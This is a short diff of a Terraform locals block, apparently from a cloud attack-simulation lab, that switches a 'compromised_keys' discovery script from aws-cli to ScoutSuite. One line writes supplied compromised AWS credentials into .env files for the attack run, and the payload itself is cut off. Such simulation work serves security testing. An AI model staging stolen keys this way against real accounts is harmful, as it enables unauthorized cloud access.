@@ -1,7 +1,7 @@
 locals {
     attack_dir = "/cloud-tunnel"
     script = "discovery.sh"
-    script_type = "aws-cli"
+    script_type = "scoutsuite"
     attack_type = "compromised_keys"
     aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
     payload = <<-EOT
